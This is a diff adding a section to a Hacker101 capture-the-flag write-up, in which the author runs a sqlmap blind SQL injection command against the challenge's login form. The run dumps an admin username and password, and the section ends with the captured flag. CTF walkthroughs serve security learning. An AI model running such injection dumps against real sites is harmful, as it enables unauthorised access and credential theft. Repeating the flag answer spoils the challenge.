@@ -130,3 +130,24 @@ So far, we've found 3 vulnerabilities we have been able to exploit:
 - **Vulnerability C:** Cross-Site Scripting (XSS) — We noticed the application encodes `<` to `&lt;` on standard inputs, but we haven't checked if a SQL Injection could be used to smuggle a raw script tag out of the database onto a page that doesn't sanitize _database outputs_.
 
 **Vulnerability A** allowed me to access flag 0 as I was able to use sqli to log into the CMS and view the private page with the first flag. **Vulnerability B** allowed me to find flag 1. **Vulnerability C** was discovered while exploring but we haven't tried anything with it just yet.
+
+## Jumping back to Deduction 1; Exploring Blind SQLi
+We are going to use sqlmap to make this easier and faster as I don't want to do blind enumeration manually.
+
+I ran `py sqlmap.py -u "https://e6f5c636b087d7b5977b22219c905559.ctf.hacker101.com/login" --data "username=&password=" --method POST --regexp "Invalid password" --dump --timeless`
+
+The relevant result of which was:
+```
+Database: level2
+Table: admins
+[1 entry]
++----+----------+----------+
+| id | password | username |
++----+----------+----------+
+| 1  | juliane  | shante   |
++----+----------+----------+
+```
+
+## Flag 3
+I logged in using those credentials and got the Flag!
+`^FLAG^8e2e4015fce89fe87550d669f7802f34e125c7d83dbf099ea84a70bcc06e78cc$FLAG$`
